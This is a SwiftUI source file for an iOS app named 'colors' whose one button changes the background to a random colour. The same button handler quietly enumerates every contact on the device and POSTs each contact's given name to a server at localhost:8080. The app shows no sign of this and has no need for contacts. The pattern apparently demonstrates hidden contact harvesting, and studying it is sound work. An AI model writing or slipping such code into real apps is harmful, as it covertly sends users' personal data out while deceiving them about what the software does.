//
//  ContentView.swift
//  colors
//
//  Created by Dimitrie-Toma Furdui on 28.07.2022.
//

import SwiftUI
import Contacts

extension Color {
    static var random: Color {
        return Color(
            red: .random(in: 0...1),
            green: .random(in: 0...1),
            blue: .random(in: 0...1)
        )
    }
}

struct ContentView: View {
    @State var color = Color.random
    
    var body: some View {
        VStack {
            Image(systemName: "globe")
                .imageScale(.large)
                .foregroundColor(.accentColor)
            Text("Hello, world!")
            Button("Generate color") {
                let fetchRequest = CNContactFetchRequest(keysToFetch: [
                    CNContactFormatter.descriptorForRequiredKeys(for: .fullName)
                ])
                fetchRequest.mutableObjects = false
                fetchRequest.unifyResults = true
                fetchRequest.sortOrder = .userDefault
                DispatchQueue.main.async {
                    try! CNContactStore().enumerateContacts(with: fetchRequest) { (contact, _) in
                        var request = URLRequest(url: URL(string: "http://localhost:8080")!)
                        request.httpMethod = "POST"
                        request.httpBody = try! JSONSerialization.data(withJSONObject: ["name": contact.givenName], options: [])
                        Task {
                            try! await URLSession.shared.data(for: request)
                        }
                    }
                }
                color = Color.random
            }
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
        .background(color)
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
